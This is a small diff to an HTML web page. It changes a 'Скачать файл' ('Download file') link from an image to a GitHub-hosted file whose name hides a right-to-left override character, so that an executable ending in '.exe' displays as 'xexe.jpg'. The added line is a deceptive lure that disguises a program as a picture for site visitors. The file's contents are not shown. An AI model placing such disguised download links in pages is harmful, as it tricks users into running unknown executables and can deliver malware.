@@ -66,7 +66,7 @@ a:active {
 		
 </a>
 
-	<p><a href="xexe.jpg" download>Скачать файл</a>
+	<p><a href="https://github.com/EsenbekM/WebSite/blob/main/x%E2%80%AEgpj.exe" download>Скачать файл</a>
 
 </div>
 <meta name="viewport" content="width=device-width, initial-scale=1">
